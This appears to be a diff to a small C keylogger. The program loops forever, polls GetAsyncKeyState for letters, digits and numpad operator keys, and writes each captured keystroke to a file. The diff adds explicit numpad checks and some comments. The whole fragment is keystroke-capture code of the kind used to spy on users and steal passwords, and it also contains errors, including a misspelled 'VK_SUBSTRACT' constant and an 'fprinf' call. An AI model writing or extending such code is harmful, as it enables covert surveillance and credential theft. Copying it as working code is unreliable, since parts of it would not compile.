@@ -8,6 +8,9 @@ int main(){
   perror("Error creating file");
   return 1;
  }
+
+ //Keys [A-Z,a-z,1-9]
+
  char mayusArr[] = {
     'A','B','C','D','E','F','G','H','I','J','K','L','M',
     'N','Ñ','O','P','Q','R','S','T','U','V','W','X','Y','Z' 
@@ -50,24 +53,36 @@ while(1){
   fflush(f);
   }
  }
- for(int x = 0 ; x<numsArrLen;x++){
+ for(int x = 0 ; x<numsArrLen;x++){ //Nums (Superior Keyboard)
  if(GetAsyncKeyState(numsArr[x])){
   fprintf(f,"%c",numsArr[x]);
   fflush(f);
   }
  }
- for(int l = 0;l<operatorsArrLen;l++){ 
-  if(GetAsignKeyState(operatorsArr[l])){
-   fprintf(f, "%c",operatorsArr[l]);
+ //Numpad operators [+-/*.]
+ if(GetAsyncKeyState(VK_MULTIPLY) & 0x8000){ 
+  fprintf(f, "*");
+  fflush(f);
+ }else if(GetAsyncKeyState(VK_ADD) & 0x8000){
+   fprintf(f, "+");
    fflush(f);
-  }
+ }else if(GetAsyncKeyState(VK_SUBSTRACT) & 0x8000){
+   fprintf(f, "-");
+   fflush(f);
+ }else if(GetAsyncKeyState(VK_DECIMAL) & 0X8000){
+   fprintf(f, ".");
+   fflush(f);
+ }else if(GetAsyncKeyState(VK_DIVIDE) &0x8000){
+    fprinf(f, "/");
+    fflush(f);
  }
 
-
+ 
 
 
 
 
 
 }//END WHILE
+return 0;
 }//END MAIN
